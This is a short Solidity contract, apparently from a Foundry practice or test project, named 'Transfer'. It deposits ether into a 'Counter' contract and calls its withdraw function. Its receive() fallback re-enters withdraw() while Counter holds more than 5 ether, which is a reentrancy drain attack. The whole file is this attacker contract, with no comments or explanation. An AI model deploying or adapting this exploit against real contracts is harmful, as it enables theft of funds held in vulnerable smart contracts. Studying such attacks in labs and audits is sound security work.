// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import {console2} from "forge-std/console2.sol";
import {Counter} from "./Counter.sol";

contract Transfer {
  Counter public counter;

  constructor(address _counter) {
    counter = Counter(_counter);
  }

  function deposit() public payable {
    counter.deposit{value: msg.value}();
    counter.withdraw(); 
  }
  
  receive() external payable {
    if(address(counter).balance > 5 ether){
      counter.withdraw();
    }
  }
}